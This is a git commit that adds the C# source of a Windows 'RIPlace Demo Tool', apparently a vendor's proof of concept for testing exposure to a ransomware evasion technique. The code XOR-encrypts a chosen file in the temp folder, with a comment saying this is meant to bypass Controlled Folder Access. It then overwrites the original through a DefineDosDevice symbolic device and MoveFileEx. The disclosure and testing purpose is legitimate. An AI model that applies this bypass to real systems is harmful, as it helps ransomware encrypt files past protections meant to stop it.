6eed852cfb22d87158af676c2a40f21bb128880b
Nyotron <33634364+Nyotron@users.noreply.github.com>
2019-11-22 12:07:13 +0200

    Uploading RIPlace C# Tool

---
+++ RIPlaceDemoSharp/MainForm.Designer.cs
@@ -0,0 +1,181 @@
+﻿namespace RIPlaceDemoSharp
+{
+    partial class MainForm
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MainForm));
+            this.lblInfo = new System.Windows.Forms.Label();
+            this.txtPath = new System.Windows.Forms.TextBox();
+            this.btnTest = new System.Windows.Forms.Button();
+            this.picLogo = new System.Windows.Forms.PictureBox();
+            this.picStatus = new System.Windows.Forms.PictureBox();
+            this.grpStatus = new System.Windows.Forms.GroupBox();
+            this.lnkLearnMore = new System.Windows.Forms.LinkLabel();
+            this.lblStatus = new System.Windows.Forms.Label();
+            ((System.ComponentModel.ISupportInitialize)(this.picLogo)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.picStatus)).BeginInit();
+            this.grpStatus.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // lblInfo
+            // 
+            this.lblInfo.Location = new System.Drawing.Point(12, 9);
+            this.lblInfo.Name = "lblInfo";
+            this.lblInfo.Size = new System.Drawing.Size(354, 61);
+            this.lblInfo.TabIndex = 0;
+            this.lblInfo.Text = resources.GetString("lblInfo.Text");
+            // 
+            // txtPath
+            // 
+            this.txtPath.AllowDrop = true;
+            this.txtPath.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.SuggestAppend;
+            this.txtPath.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.FileSystem;
+            this.txtPath.Location = new System.Drawing.Point(12, 71);
+            this.txtPath.Name = "txtPath";
+            this.txtPath.Size = new System.Drawing.Size(469, 20);
+            this.txtPath.TabIndex = 0;
+            this.txtPath.TextChanged += new System.EventHandler(this.txtPath_TextChanged);
+            this.txtPath.DragDrop += new System.Windows.Forms.DragEventHandler(this.txtPath_DragDrop);
+            this.txtPath.DragEnter += new System.Windows.Forms.DragEventHandler(this.txtPath_DragEnter);
+            this.txtPath.KeyDown += new System.Windows.Forms.KeyEventHandler(this.txtPath_KeyDown);
+            this.txtPath.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtPath_KeyPress);
+            // 
+            // btnTest
+            // 
+            this.btnTest.Enabled = false;
+            this.btnTest.Location = new System.Drawing.Point(487, 69);
+            this.btnTest.Name = "btnTest";
+            this.btnTest.Size = new System.Drawing.Size(75, 23);
+            this.btnTest.TabIndex = 2;
+            this.btnTest.Text = "RIPlace";
+            this.btnTest.UseVisualStyleBackColor = true;
+            this.btnTest.Click += new System.EventHandler(this.btnTest_Click);
+            // 
+            // picLogo
+            // 
+            this.picLogo.Image = ((System.Drawing.Image)(resources.GetObject("picLogo.Image")));
+            this.picLogo.Location = new System.Drawing.Point(372, 9);
+            this.picLogo.Name = "picLogo";
+            this.picLogo.Size = new System.Drawing.Size(190, 55);
+            this.picLogo.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.picLogo.TabIndex = 4;
+            this.picLogo.TabStop = false;
+            // 
+            // picStatus
+            // 
+            this.picStatus.Image = global::RIPlaceDemoSharp.Properties.Resources.ready;
+            this.picStatus.Location = new System.Drawing.Point(11, 19);
+            this.picStatus.Name = "picStatus";
+            this.picStatus.Size = new System.Drawing.Size(70, 70);
+            this.picStatus.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.picStatus.TabIndex = 5;
+            this.picStatus.TabStop = false;
+            // 
+            // grpStatus
+            // 
+            this.grpStatus.Controls.Add(this.lnkLearnMore);
+            this.grpStatus.Controls.Add(this.picStatus);
+            this.grpStatus.Controls.Add(this.lblStatus);
+            this.grpStatus.Location = new System.Drawing.Point(12, 99);
+            this.grpStatus.Name = "grpStatus";
+            this.grpStatus.Size = new System.Drawing.Size(550, 100);
+            this.grpStatus.TabIndex = 7;
+            this.grpStatus.TabStop = false;
+            this.grpStatus.Text = "Status";
+            // 
+            // lnkLearnMore
+            // 
+            this.lnkLearnMore.AutoSize = true;
+            this.lnkLearnMore.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lnkLearnMore.LinkBehavior = System.Windows.Forms.LinkBehavior.NeverUnderline;
+            this.lnkLearnMore.Location = new System.Drawing.Point(464, 76);
+            this.lnkLearnMore.Name = "lnkLearnMore";
+            this.lnkLearnMore.Size = new System.Drawing.Size(80, 13);
+            this.lnkLearnMore.TabIndex = 7;
+            this.lnkLearnMore.TabStop = true;
+            this.lnkLearnMore.Text = "Find out more...";
+            this.lnkLearnMore.TextAlign = System.Drawing.ContentAlignment.TopRight;
+            this.lnkLearnMore.Visible = false;
+            this.lnkLearnMore.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.lnkLearnMore_LinkClicked);
+            // 
+            // lblStatus
+            // 
+            this.lblStatus.Location = new System.Drawing.Point(87, 19);
+            this.lblStatus.Name = "lblStatus";
+            this.lblStatus.Size = new System.Drawing.Size(457, 57);
+            this.lblStatus.TabIndex = 6;
+            this.lblStatus.Text = "Status";
+            this.lblStatus.Click += new System.EventHandler(this.lblStatus_Click);
+            // 
+            // MainForm
+            // 
+            this.AllowDrop = true;
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.White;
+            this.ClientSize = new System.Drawing.Size(574, 211);
+            this.Controls.Add(this.grpStatus);
+            this.Controls.Add(this.picLogo);
+            this.Controls.Add(this.btnTest);
+            this.Controls.Add(this.txtPath);
+            this.Controls.Add(this.lblInfo);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.MaximumSize = new System.Drawing.Size(590, 250);
+            this.MinimizeBox = false;
+            this.MinimumSize = new System.Drawing.Size(590, 250);
+            this.Name = "MainForm";
+            this.RightToLeftLayout = true;
+            this.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "RIPlace Demo Tool";
+            this.DragDrop += new System.Windows.Forms.DragEventHandler(this.txtPath_DragDrop);
+            this.DragEnter += new System.Windows.Forms.DragEventHandler(this.txtPath_DragEnter);
+            ((System.ComponentModel.ISupportInitialize)(this.picLogo)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.picStatus)).EndInit();
+            this.grpStatus.ResumeLayout(false);
+            this.grpStatus.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label lblInfo;
+        private System.Windows.Forms.TextBox txtPath;
+        private System.Windows.Forms.Button btnTest;
+        private System.Windows.Forms.PictureBox picLogo;
+        private System.Windows.Forms.PictureBox picStatus;
+        private System.Windows.Forms.GroupBox grpStatus;
+        private System.Windows.Forms.Label lblStatus;
+        private System.Windows.Forms.LinkLabel lnkLearnMore;
+    }
+}
+
---
+++ RIPlaceDemoSharp/MainForm.cs
@@ -0,0 +1,397 @@
+﻿using System;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace RIPlaceDemoSharp
+{
+    public partial class MainForm : Form
+    {
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        private static extern bool DefineDosDeviceW(uint dwFlags, string lpDeviceName, string lpTargetPath);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        internal static extern bool MoveFileExW(string lpExistingFileName, string lpNewFileName, uint dwFlags);
+        
+        private const uint DDD_RAW_TARGET_PATH = 0x00000001;
+        private const uint DDD_REMOVE_DEFINITION = 0x00000002;
+
+        private const uint MOVEFILE_REPLACE_EXISTING = 0x00000001;
+        private const uint MOVEFILE_WRITE_THROUGH = 0x00000008;
+
+        private const string _dosDevName = "RIPlace";
+        private const string _dosDevPath = @"\\.\" + _dosDevName;
+        
+        private const string _key = "riplace.fyi";
+
+        private bool _clearTextProgrammatically = false;
+        private const string _instructions = "To start, either manually enter a path or drag and drop a file onto this window.";
+
+        private enum Status { Ready, OK, Fail, Error }
+
+        private Status _currentStatus = Status.Ready;
+        private string _lastPath = string.Empty;
+        private string _lastError = string.Empty;
+
+        public MainForm()
+        {
+            InitializeComponent();
+            
+            ChangeStatus(Status.Ready, true);
+            ShowInstructions(true);
+        }
+
+        private void ChangeStatus(Status status, bool force = false)
+        {
+            if (!force && status == _currentStatus)
+                return;
+
+            _currentStatus = status;
+
+            lnkLearnMore.Visible = !(status == Status.Ready);
+
+            switch (status)
+            {
+                case Status.Ready:
+                    picStatus.Image = Properties.Resources.ready;
+                    lblStatus.Text = "Ready to launch.";
+                    break;
+                case Status.OK:
+                    picStatus.Image = Properties.Resources.ok;
+                    lblStatus.Text = "Based on the selected file, your system may be exposed to the RIPlace technique.";
+                    break;
+                case Status.Fail:
+                    picStatus.Image = Properties.Resources.fail;
+                    lblStatus.Text = "The attempt to overwrite the selected file was unsuccessful.\n" + _lastError;
+                    break;
+                case Status.Error:
+                    picStatus.Image = Properties.Resources.error;
+                    lblStatus.Text = "Error occurred; failed to execute test (click to show details).";
+                    break;
+                default:
+                    break;
+            }
+        }
+
+        private bool IsFilePathValid(string filePath)
+        {
+            if (string.IsNullOrEmpty(filePath) || string.IsNullOrWhiteSpace(filePath))
+                return false;
+
+            if (!File.Exists(filePath))
+                return false;
+
+            return true;
+        }
+
+        private string GetAllExceptionMessages(ref Exception ex)
+        {
+            if (ex == null)
+                return string.Empty;
+
+            string exceptionMessages = string.Empty;
+            do
+            {
+                exceptionMessages += ex.Message + "\n";
+            } while ((ex = ex.InnerException) != null);
+
+            return exceptionMessages;
+        }
+
+        void SetLastErrorMessage(string failedFunction, int errorCode)
+        {
+            if (string.IsNullOrEmpty(failedFunction) || string.IsNullOrWhiteSpace(failedFunction))
+                return;
+
+            if (errorCode == 0)
+                _lastError = "Error: " + failedFunction;
+            else
+                _lastError = string.Format("Error: " + failedFunction + " failed (0x{0:X8} - " + (new Win32Exception(errorCode).Message) + ")", errorCode);
+        }
+
+        void SetLastErrorMessage(string errorMessage)
+        {
+            SetLastErrorMessage(errorMessage, 0);
+        }
+
+        private bool PrepareToRIPlace(string targetFilePath, out string encryptedFilePath)
+        {
+            encryptedFilePath = string.Empty;
+
+            if (!IsFilePathValid(targetFilePath))
+            {
+                SetLastErrorMessage("Path is either empty or points to a non-existing file.");
+                return false;
+            }
+            byte[] buffer;
+
+            try
+            {
+                buffer = File.ReadAllBytes(targetFilePath);
+            }
+            catch (Exception ex)
+            {
+                SetLastErrorMessage("Failed to read target file.\n" + GetAllExceptionMessages(ref ex));
+                return false;
+            }
+
+            if (buffer.Length <= 0)
+            {
+                SetLastErrorMessage("Target file should not be empty.");
+                return false;
+            }
+            for (int i = 0; i < buffer.Length; i++)
+            {
+                buffer[i] ^= (byte)_key[i % _key.Length];
+            }
+
+            string currentDir = string.Empty;
+            try
+            {
+                //currentDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "\\";
+                currentDir = Path.GetTempPath() + "\\"; // this replaces the above to bypass CFA (create encryped file in temp folder)
+            }
+            catch (Exception ex)
+            {
+                SetLastErrorMessage("Failed to get current directory.\n" + GetAllExceptionMessages(ref ex));
+                return false;
+            }
+
+            string guid;
+
+            do
+            {
+                guid = Guid.NewGuid().ToString();
+            } while (File.Exists(currentDir + guid));
+
+            encryptedFilePath = currentDir + guid;
+            try
+            {
+                File.WriteAllBytes(encryptedFilePath, buffer);
+            }
+            catch (Exception ex)
+            {
+                SetLastErrorMessage("Failed to write encrypted file.\n" + GetAllExceptionMessages(ref ex));
+                return false;
+            }
+
+            return true;
+        }
+
+        private void Cleanup(string fileToDelete = null)
+        {
+            DefineDosDeviceW(DDD_REMOVE_DEFINITION | DDD_RAW_TARGET_PATH, _dosDevName, string.Empty);
+
+            if (!IsFilePathValid(fileToDelete))
+                return;
+
+            try
+            {
+                File.Delete(fileToDelete);
+            }
+            catch
+            {
+                ; // I don't care
+            }
+        }
+
+        private bool RIPlace(string sourceFilePath, string destinationFilePath)
+        {
+            if (!DefineDosDeviceW(DDD_RAW_TARGET_PATH, _dosDevName, @"\??\" + destinationFilePath))
+            {
+                SetLastErrorMessage("DefineDosDevice", Marshal.GetLastWin32Error());
+                return false;
+            }
+
+            if (!MoveFileExW(sourceFilePath, _dosDevPath, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH))
+            {
+                SetLastErrorMessage("MoveFileEx", Marshal.GetLastWin32Error());
+                return false;
+            }
+
+            return true;
+        }
+
+        void ShowInstructions(bool show, bool overwriteText = true)
+        {
+            if (overwriteText)
+            {
+                if (!show)
+                {
+                    _clearTextProgrammatically = true;
+                }
+                txtPath.Text = show ? _instructions : "";
+                ChangeStatus(Status.Ready);
+            }
+            txtPath.ForeColor = show ? SystemColors.GrayText : SystemColors.WindowText;
+            txtPath.SelectionStart = (txtPath.Text == _instructions) ? 0 : txtPath.Text.Length;
+            txtPath.SelectionLength = 0;
+        }
+
+        private void txtPath_DragEnter(object sender, DragEventArgs e)
+        {
+            if (e.Data.GetDataPresent(DataFormats.FileDrop))
+                e.Effect = DragDropEffects.Copy;
+            else
+                e.Effect = DragDropEffects.None;
+        }
+
+        private void txtPath_DragDrop(object sender, DragEventArgs e)
+        {
+            string[] filePaths = (string[])e.Data.GetData(DataFormats.FileDrop, false);
+
+            if (filePaths.Length < 1)
+            {
+                e.Effect = DragDropEffects.None;
+                return;
+            }
+
+            if (!IsFilePathValid(filePaths[0]))
+            {
+                e.Effect = DragDropEffects.None;
+                return;
+            }
+
+            txtPath.Text = filePaths[0];
+        }
+
+        private void txtPath_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (!(e.Control && e.KeyCode == Keys.V))
+                return;
+
+            e.SuppressKeyPress = true;
+
+            string clipboard = string.Empty;
+
+            if (Clipboard.ContainsText())
+            {
+                clipboard = Clipboard.GetText().Replace("\"", "");
+            }
+            else if (Clipboard.ContainsFileDropList())
+            {
+                var list = Clipboard.GetFileDropList();
+                if (list.Count <= 0)
+                    return;
+
+                clipboard = list[0].Replace("\"", "");
+            }
+            else
+            {
+                return;
+            }
+
+            if (!IsFilePathValid(clipboard))
+                return;
+
+            ShowInstructions(false);
+            txtPath.Text = clipboard;
+        }
+
+        private void txtPath_KeyPress(object sender, KeyPressEventArgs e)
+        {
+            if (txtPath.Text != _instructions)
+                return;
+
+            ShowInstructions(false);
+        }
+
+        private void txtPath_TextChanged(object sender, EventArgs e)
+        {
+            btnTest.Enabled = File.Exists(txtPath.Text);
+
+            if (string.IsNullOrEmpty(txtPath.Text) || string.IsNullOrWhiteSpace(txtPath.Text))
+            {
+                if (_clearTextProgrammatically)
+                {
+                    _clearTextProgrammatically = false;
+                    return;
+                }
+
+                ShowInstructions(true);
+                return;
+            }
+
+            ShowInstructions(false, false);
+
+            if (string.IsNullOrEmpty(_lastPath) || string.IsNullOrWhiteSpace(_lastPath)
+                || txtPath.Text == _lastPath || !IsFilePathValid(txtPath.Text) || _currentStatus == Status.Ready)
+            {
+                return;
+            }
+
+            ChangeStatus(Status.Ready);
+        }
+
+        private void btnTest_Click(object sender, EventArgs e)
+        {
+            if (!IsFilePathValid(txtPath.Text))
+                return;
+
+            string confirmation = "Are you sure you want to overwrite \"" + txtPath.Text + "\"?\n"
+            + "If you choose to continue, the tool will attempt to encrypt this file with a simple XOR cipher.\n"
+            + "To decrypt the file, just re-run the tool for the same file.";
+            DialogResult dr = MessageBox.Show(confirmation, "Are you sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2);
+
+            if (dr != DialogResult.Yes)
+                return;
+
+            Cleanup();
+
+            _lastPath = txtPath.Text;
+
+            string encryptedFilePath = string.Empty;
+
+            if (!PrepareToRIPlace(txtPath.Text, out encryptedFilePath))
+            {
+                Cleanup(encryptedFilePath);
+                ChangeStatus(Status.Error);
+                return;
+            }
+
+            if (!RIPlace(encryptedFilePath, txtPath.Text))
+            {
+                Cleanup(encryptedFilePath);
+                ChangeStatus(Status.Fail);
+                return;
+            }
+
+            Cleanup();
+            ChangeStatus(Status.OK);
+            return;
+        }
+
+        private void lblStatus_Click(object sender, EventArgs e)
+        {
+            if (string.IsNullOrEmpty(_lastError) || string.IsNullOrWhiteSpace(_lastError)
+                || _currentStatus != Status.Error)
+                return;
+
+            MessageBox.Show(_lastError, "Details", MessageBoxButtons.OK);
+        }
+
+        private void lnkLearnMore_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            switch (_currentStatus)
+            {
+                case Status.Ready:
+                    Process.Start("http://riplace.fyi"); // shouldn't happen
+                    break;
+                case Status.OK:
+                    Process.Start("http://riplace.fyi/o");
+                    break;
+                case Status.Fail:
+                    Process.Start("http://riplace.fyi/f");
+                    break;
+                case Status.Error:
+                    Process.Start("http://riplace.fyi/e");
+                    break;
+                default:
+                    break;
+            }
+        }
+    }
+}
